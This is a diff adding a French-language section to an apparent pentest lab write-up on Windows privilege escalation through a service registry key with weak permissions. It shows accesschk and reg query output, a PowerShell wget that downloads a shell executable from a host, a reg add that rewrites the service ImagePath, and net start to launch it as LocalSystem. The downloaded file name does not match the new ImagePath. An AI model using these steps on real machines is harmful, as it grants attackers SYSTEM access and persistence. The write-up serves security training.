@@ -59,3 +59,61 @@ En détournant les entrées du registre utilisées par les services, les attaqua
 **Windows Registry**
 Le registre est une base de données définie par le système dans laquelle les applications et les composants du système stockent et récupèrent des données de configuration. Le registre est une base de données hiérarchique qui contient des données essentielles au fonctionnement de Windows et des applications et services qui s'exécutent sur Windows.
 
+Un attaquant peut élever ses privilèges en exploitant une permission faible du Registre si l'utilisateur actuel a la permission de modifier les clés du Registre associées au service.
+
+- Après une première prise de contact, nous pouvons demander les permissions des clés de registre du service à l'aide de l'outil Sysinternals `accesschk.exe`
+```
+C:\Users\vboxuser\AppData\Local\Temp>accesschk.exe /accepteula "authenticated users" -kvuqsw hklm\System\CurrentControlSet\services
+Sysinternals - www.sysinternals.com
+
+ W HKLM\System\CurrentControlSet\services\BTAGService\Parameters\Settings
+	KEY_CREATE_SUB_KEY
+	KEY_SET_VALUE
+	READ_CONTROL
+RW HKLM\System\CurrentControlSet\services\embeddedmode\Parameters
+	KEY_QUERY_VALUE
+	KEY_CREATE_SUB_KEY
+	KEY_ENUMERATE_SUB_KEYS
+	KEY_NOTIFY
+	READ_CONTROL
+RW HKLM\System\CurrentControlSet\services\pentest
+	KEY_ALL_ACCESS
+RW HKLM\System\CurrentControlSet\services\vds\Alignment
+	KEY_QUERY_VALUE
+	KEY_CREATE_SUB_KEY
+	KEY_ENUMERATE_SUB_KEYS
+	READ_CONTROL
+```
+je trouve dans ma detection que le `RW HKLM\System\CurrentControlSet\services\pentest` est `	KEY_ALL_ACCESS` un access complet
+je vais faire du `reg query` sur ce registre `HKLM\System\CurrentControlSet\services\pentest` la pour plus d'infos
+```
+C:\Users\vboxuser\AppData\Local\Temp>reg query hklm\System\CurrentControlSet\services\pentest
+reg query hklm\System\CurrentControlSet\services\pentest
+
+HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pentest
+    Type    REG_DWORD    0x10
+    Start    REG_DWORD    0x3
+    ErrorControl    REG_DWORD    0x1
+    ImagePath    REG_EXPAND_SZ    C:\temp\service.exe
+    ObjectName    REG_SZ    LocalSystem
+
+HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pentest\Security
+
+C:\Users\vboxuser\AppData\Local\Temp>
+
+```
+Voici le program vulnerable qui est juste le `C:\temp\service.exe`
+Pour l'exploiter:
+- Create Malicious Executable 
+Créer un shell exécutable et l'installer sur la machine de la victime, puis modifier la clé de registre du service en un exécutable puisque l'utilisateur authentifié a un accès complet au service et a donc la possibilité de modifier le chemin d'accès à l'image du service.
+
+```
+C:\Users\vboxuser\AppData\Local\Temp>powershell wget http://192.168.56.1/shell2.exe -o s2.exe
+
+reg add "HKLM\system\currentcontrolset\services\pentest" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\Public\shell.exe" /f
+```
+Then 
+```
+net start pentest
+```
+Lorsque le service démarre ou est redémarré, le programme contrôlé par l'adversaire s'exécute, ce qui permet à ce dernier d'obtenir la persistance et/ou l'escalade des privilèges dans le contexte du compte sous lequel le service est censé s'exécuter (compte local/domaine, SYSTEM, LocalService ou NetworkService).
